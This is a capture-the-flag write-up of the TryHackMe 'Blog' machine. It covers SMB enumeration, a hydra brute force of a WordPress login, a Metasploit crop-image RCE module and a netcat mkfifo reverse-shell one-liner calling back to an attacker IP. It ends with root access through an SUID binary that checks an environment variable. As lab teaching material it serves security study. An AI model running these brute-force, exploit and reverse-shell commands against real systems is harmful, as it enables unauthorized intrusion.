---
description: Billy Joel made a Wordpress blog! - by  Nameless0ne
---

# Blog

***

Platform : [Tryhackme](https://tryhackme.com/room/blog)

Difficulty: Medium

Machine Type: Linux

***

### Scanning and Enumeration

Nmap scan results:

```
┌──(ghost㉿kali)-[~/tryhackme/blog]
└─$ sudo nmap -Pn -A -p- --min-rate 3000 blog.thm -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 23:33 EDT
Nmap scan report for 10.201.71.207
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-08-30T03:34:18+00:00
| smb2-time: 
|   date: 2025-08-30T03:34:18
|_  start_date: N/A
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

As we can see port 22(ssh), 80(http), 139(netbios-ssn) and port 445(smb) is open.

Nmap scan also revealed, there is some kind of WordPress(5.0) site with title 'Billy Joel's IT Blog' is hosted on port 80. But first of all we can check for shares present and accessible to us via smb port 445.

At first, I listed all shares of the target machine via smbclient.

```
┌──(ghost㉿kali)-[~/tryhackme/blog]
└─$ smbclient -L '/10.201.71.207' -U ''
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

From all those 3 shares, 'billySMB' look's a little bit suspicious and so I connected to it and downloaded

all files that were hosted there.

```
┌──(ghost㉿kali)-[~/tryhackme/blog]
└─$ smbclient '//10.201.71.207/BillySMB' -U ''
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Checked all those 3 files one by one:

<details>

<summary>Alice-White-Rabbit.jpg</summary>

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

I tried to extract file with steghide, if any present hidden inside that image.

```
┌──(ghost㉿kali)-[~/tryhackme/blog]
└─$ steghide extract -sf Alice-White-Rabbit.jpg
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Yeah, there was a file hidden inside that image, but it's content shows that I am in a rabbit hole.

Nothing interesting here.

</details>

<details>

<summary>tswift.mp4</summary>

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Just a mp4 video file of taylor swift song and with no hints. Again a rabbit hole.

</details>

<details>

<summary>check-this.png</summary>

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

When I scanned this QR with my phone, I got redirected to a song by billy joel. Again a rabbit hole, nothing of our interest.

</details>

Looking at all those files showed, SMB port was just a rabbit hole and nothing of our interest here, not even a hint.

Next I moved on to port 80, where a blog website hosted using WordPress CMS.

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Login page was also present on `http://blog.thm/wp-login.php`

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

As this website was built using WordPress, I instantly enumerated it using wpscan for usernames, vulnerable plugins, vulnerable themes etc.

***

### WordPress Dashboard access as kwheel

```
┌──(ghost㉿kali)-[~/tryhackme/blog]
└─$ wpscan --url "blog.thm" -e u, vp, vt --no-update
```

And I got 2 valid usernames - <mark style="color:yellow;">kwheel</mark> and <mark style="color:yellow;">bjoel</mark>

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

For confirmation, I also checked them on login page by entering random password for them.

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Error: The password you entered for the username kwheel is incorrect. Lost your password?
{% endhint %}

Which means username kwheel is valid.

Next, I brute forced the password for kwheel user using hydra and found a valid password.

```
┌──(ghost㉿kali)-[~/tryhackme/blog]
└─$ hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" 
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Tried to log on WordPress login page with that found credentials and logged in as kwheel.

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

***

### Shell as www-data

I searched for potential exploit on google for that particular version of WordPress 5.0 and there I found a public Metasploit exploit available on [exploit-db](https://www.exploit-db.com/exploits/46662) for that version of WordPress.

{% embed url="https://www.exploit-db.com/exploits/46662" %}

I searched for that crop-image module through msfconsole and found that module.

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

I used that module and set some of the options needed to run that payload successfully.

```
msf6 exploit(multi/http/wp_crop_rce) > set LHOST <kali-machine-IP>
LHOST => 10.17.87.131
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS blog.thm
RHOSTS => blog.thm
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD REDACTED
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > run
```

Running that module provided me with a meterpreter shell.

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

I created a reverse shell file inside /tmp folder of target machine. Triggering that shell there provided me with a reverse shell connection and a better shell then previous one.

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.87.131 4445 >/tmp/f' > rev.sh
chmod +x rev.sh
./rev.sh
```

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

***

### Shell as Root

There was a fake user.txt present inside bjoel's home directory.

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Next, I tried multiple steps to gain higher privileges like password resuse, connecting to mysql database through the password I found inside wp-config.php file , but that didn't worked.

While enumerating for SUID files, I found an interesting binary <mark style="color:red;">/usr/bin/checker</mark> which was owned by root.

```
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

I tried running that binary and got a message - <mark style="color:yellow;">Not an Admin</mark>

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Next, I tried running it with <mark style="color:red;">`ltrace`</mark> to get more detail about it's running process.

{% hint style="info" %}
`ltrace` is a command-line debugging and diagnostic utility in Linux. Its primary function is to trace and display the calls made by a userspace application to shared libraries. It achieves this by intercepting and recording the dynamic library calls and the signals received by the traced process.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Looks like it's checking value of environment variable 'admin' if it's nil (or not present) then , it is just printing 'Not an Admin'. And what if we set our environment variable 'admin' to 1.

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Ok, now as we run that binary again, it will set our uid to 0(root) and will spawn a /bin/bash shell as root.

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Grabbed the root flag

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Now, just user flag is remaining, which I found using the following command:

```
find / -type f -name "user*" 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Grabbed the user flag

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

***

That's it for this machine.✅
